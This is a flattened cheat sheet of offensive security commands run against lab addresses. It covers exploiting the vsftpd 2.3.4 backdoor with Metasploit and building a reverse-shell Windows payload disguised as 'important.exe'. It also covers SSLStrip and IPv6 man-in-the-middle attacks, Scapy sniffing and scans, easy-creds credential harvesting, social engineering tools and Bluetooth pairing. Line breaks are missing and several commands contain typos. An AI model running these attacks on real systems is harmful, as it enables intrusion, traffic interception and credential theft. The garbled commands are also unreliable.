************************************************************************ Running Metasploit************************************************************************ Step 1: Initialize DBmsfdb deletemsfdb init* Step 2: Start Metasploitmsfconsole* Step 3: Scanning* Option 1: In separate terminal, scan for hosts and dump to file for Metasploitnmap -sS -oX [Target Filename] [Subnet/24 or Host]* Examplenmap -Pn -sS -A -oX TARGET1 192.168.10.128* Import scan resultsmsf > db_import TARGET1* Option 2: direct scan from msfconsolemsf > db_nmap -sS -A 192.168.10.128* See hosts from scanmsf > hosts************************************************************************ See open services from scan, search for relevant vulns, and use them!************************************************************************ See resultsmsf > services* Search vulns librarymsf > search vsftpd* Use exploitmsf > use exploit/unix/ftp/vsftpd_234_backddoor* See required and optional settingsmsf_exploit(vsftpd_234_backddoor) > show options* Set Remote host (which is target)msf_exploit(vsftpd_234_backddoor) > set RHOST 192.168.10.128* Run Vuln!msf_exploit(vsftpd_234_backddoor) > exploit************************************************************************ Wrapping Payloads************************************************************************ Use reverse TCP payloadmsf > use payload/windows/shell/reverse_tcp 0 X > immportant.exe* see required and optional settings for payloadmsf payload(reverse_tcp) > show options* Set Local Host for this payloadmsf payload(reverse_tcp) > set LHOST 192.168.10.129* Generate the payloadmsf payload(reverse_tcp) > generate -f /root/important.exe************************************************************************ Social Engineering Toolkit************************************************************************ Enable Bleeding Edge Reposecho deb http://http.kali.org/kali kali-bleeding-edgecontrib non-free main >> /etc/apt/sources.listapt-get updateapt-get upgrade* Install SETgit clone https://github.com/trustedsec/social-engineer-toolkit/ set/* Run SETsetoolkit************************************************************************ Browser Exploitation Framework (BeEF)************************************************************************ Start BeEFcd /use/share/beef-xss./beef************************************************************************ SSLStrip************************************************************************ Firewall changeiptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $LISTEN-PORT* Example of aboveiptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080* Start SSLStripsslstrip -a -l 8080 -w sslstrip.log************************************************************************ Parasitev6************************************************************************ Install IPv6 tools for Parasiteapt-get install thc-ipv6* Enable IPv6 packet forwardingecho 1 > /proc/sys/net/ipv6/conf/all/forwarding* Run Parasiteatk6-parasite6 -lR eth0* Monitor (separate Terminal session)tcpdump -w http-ipv6.pcap port 80 and ip6************************************************************************ Scapy************************************************************************ Start Scapyscapy* Sniff the network>>> sniff()* Per-flow breakdown>>> b=_>>> b.summary()* Dump the results of flow 22 in the array>>> b[22]* Assigning a variable and then getting synopsis of that variable, an ipv6 pcap file>>> a=rdpcap("ipv6.pcap")>>> a* Assigning another file to a variable and then seeing synopsis that variable >>> b=rdpcap("http-ipv6.pcap")>>> b* Deeper visibility into flows contained in pcap file>>> c=rdpcap("SSH.pcap")>>> c.show()* Dump the results of flow 22 in the array>>> c[22]* Create then show a packet>>> d=(IP(dst="192.168.1.38")/ICMP()/"This is a packet created by Scapy")>>> d.show()###[ IP ]###  version= 4  ihl= None  tos= 0x0  len= None  id= 1  flags=  frag= 0  ttl= 64  proto= icmp  chksum= None  src= 192.168.1.222  dst= 192.168.1.38  \options\###[ ICMP ]###    type= echo-request    code= 0    chksum= None    id= 0x0    seq= 0x0###[ Raw ]###      load= 'This is a packet created by Scapy'* Send the packet>>> sr(d)* Compress the send and create in 1 step>>> send(IP(dst="192.168.1.38")/ICMP()/"This is a packet created by Scapy")* See send and receive information>>> ans,unans=_>>> ans.summary()* Create and send malformed packet>>> d=IP(dst="192.168.1.38", ihl=2, version=10)/ICMP()>>> d.show()>>> send(d)* Check ports using TCP SYN Scan packets>>> result,unans = sr(IP(dst="192.168.1.134Ó)/TCP(flags="S",dport=[22,23,25,80,443,3306]))* See results of the scan>>> result.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )************************************************************************ Easy-creds************************************************************************ Install Easy-creds (after downloading from website)cd Downloadstar -zxvf easy-creds-3.8-DEV.tar.gzcd easy-credschmod 777 installer.sh./installer.sh* Run Easy-creds./easy-creds.sh************************************************************************ Bluetooth testing************************************************************************ Running Bluelog and recording results in bt.log filebluelog -o bt.log -vnmc* viewing bt.logcat bt.log* Running Bluerangerblueranger.sh hci0 <MAC address of target>* Running btscannerbtscanner* Connecting to bluetooth device (audio device in this test case)bluetoothctl[bluetooth]# power on[bluetooth]# agent KeyboardOnly[bluetooth]# trust 8C:DE:52:1F:F5:07[bluetooth]# connect 8C:DE:52:1F:F5:07* In new window, can play music through paired speakermplayer -ao pulse /usr/share/orage/sounds/Phone.wav